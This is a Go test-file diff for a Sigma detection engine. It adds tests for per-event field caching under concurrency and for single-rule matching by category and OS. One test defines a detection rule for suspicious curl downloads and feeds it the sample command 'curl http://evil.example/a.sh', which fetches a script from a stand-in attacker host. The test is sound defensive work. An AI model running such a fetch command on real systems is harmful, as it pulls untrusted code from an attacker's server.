@@ -2,6 +2,7 @@ package sigma
 
 import (
 	"encoding/json"
+	"fmt"
 	"os"
 	"path/filepath"
 	"strings"
@@ -145,6 +146,57 @@ func TestFieldTestMatches(t *testing.T) {
 	nullBad := fieldTest{path: []string{"process", "cmd_line"}, expectNull: true}
 	if nullBad.matches(raw) {
 		t.Error("expectNull 且字段存在应为 false")
+	}
+}
+
+func TestEvaluateFieldCacheIsPerEvent(t *testing.T) {
+	first, err := Compile([]byte(reloadRuleA))
+	if err != nil {
+		t.Fatal(err)
+	}
+	second, err := Compile([]byte(reloadRuleB))
+	if err != nil {
+		t.Fatal(err)
+	}
+	keyword, err := Compile([]byte("id: keyword\ntitle: keyword\nlogsource: {category: process_creation}\ndetection:\n  selection: [marker]\n  condition: selection\n"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	state := &engineState{rules: []*Rule{first, second, keyword}, byID: map[string]*Rule{first.ID: first, second.ID: second, keyword.ID: keyword}}
+	state.index()
+	engine := &Engine{}
+	engine.state.Store(state)
+	raw := map[string]any{"process": map[string]any{"cmd_line": "run aaa now"}}
+	if hits := engine.Evaluate(1007, "", raw); len(hits) != 1 || hits[0].ID != first.ID {
+		t.Fatalf("aaa 应只命中第一条规则: %v", ruleIDs(hits))
+	}
+	raw["process"].(map[string]any)["cmd_line"] = "run bbb now"
+	if hits := engine.Evaluate(1007, "", raw); len(hits) != 1 || hits[0].ID != second.ID {
+		t.Fatalf("更新事件字段后 bbb 应只命中第二条规则: %v", ruleIDs(hits))
+	}
+	if hits := engine.Evaluate(1007, "", map[string]any{}); len(hits) != 0 {
+		t.Fatalf("缺失字段不应沿用上一条事件的缓存: %v", ruleIDs(hits))
+	}
+	if hits := engine.Evaluate(1007, "", map[string]any{"message": "MARKER"}); len(hits) != 1 || hits[0].ID != keyword.ID {
+		t.Fatalf("全文缓存应使用当前事件: %v", ruleIDs(hits))
+	}
+	if hits := engine.Evaluate(1007, "", map[string]any{}); len(hits) != 0 {
+		t.Fatalf("全文缓存不应保留上一条事件: %v", ruleIDs(hits))
+	}
+	for i := range 8 {
+		t.Run(fmt.Sprint(i), func(t *testing.T) {
+			t.Parallel()
+			text, want := "AAA", first.ID
+			if i%2 != 0 {
+				text, want = "BBB", second.ID
+			}
+			input := map[string]any{"process": map[string]any{"cmd_line": text}}
+			for range 100 {
+				if hits := engine.Evaluate(1007, "", input); len(hits) != 1 || hits[0].ID != want {
+					t.Fatalf("并发事件不应共享字段缓存: %v", ruleIDs(hits))
+				}
+			}
+		})
 	}
 }
 
@@ -603,5 +655,53 @@ func TestCIDRWindashRegexFlags(t *testing.T) {
 	}
 	if _, err := compileFieldTest("destinationip|cidr", "10.0.0.0/33"); err == nil {
 		t.Error("非法网段应拒绝加载")
+	}
+}
+
+// Rule.Matches 单规则独立求值：校验类别过滤、操作系统过滤、单事件匹配与时序规则排除。
+func TestRuleMatchesSingleRule(t *testing.T) {
+	dir := t.TempDir()
+	ruleBody := `
+id: bt-rule-1
+title: Suspicious curl download
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection:
+    CommandLine|contains: 'curl http://'
+  condition: selection
+level: medium
+`
+	if err := os.WriteFile(filepath.Join(dir, "bt.yml"), []byte(ruleBody), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	eng := LoadDir(dir)
+	rules := eng.Rules()
+	if len(rules) != 1 {
+		t.Fatalf("expected 1 rule, got %d", len(rules))
+	}
+	r := rules[0]
+	hitRaw := map[string]any{"process": map[string]any{"cmd_line": "curl http://evil.example/a.sh"}}
+	missRaw := map[string]any{"process": map[string]any{"cmd_line": "ls -la"}}
+
+	if !r.Matches(1007, "linux", hitRaw) {
+		t.Error("Matches 应命中匹配的 Linux 进程事件")
+	}
+	if !r.Matches(1007, "", hitRaw) {
+		t.Error("资产 OS 未知时 Matches 也应求值并命中")
+	}
+	if r.Matches(1007, "windows", hitRaw) {
+		t.Error("Linux 规则不应在 Windows 资产事件上命中")
+	}
+	if r.Matches(4001, "linux", hitRaw) {
+		t.Error("进程规则不应在网络事件 class=4001 上命中")
+	}
+	if r.Matches(1007, "linux", missRaw) {
+		t.Error("不满足条件的不应命中")
+	}
+	temporal := &Rule{ID: "seq", Kind: "sequence"}
+	if temporal.Matches(1007, "linux", hitRaw) {
+		t.Error("跨事件时序规则 Matches 应恒返回 false")
 	}
 }
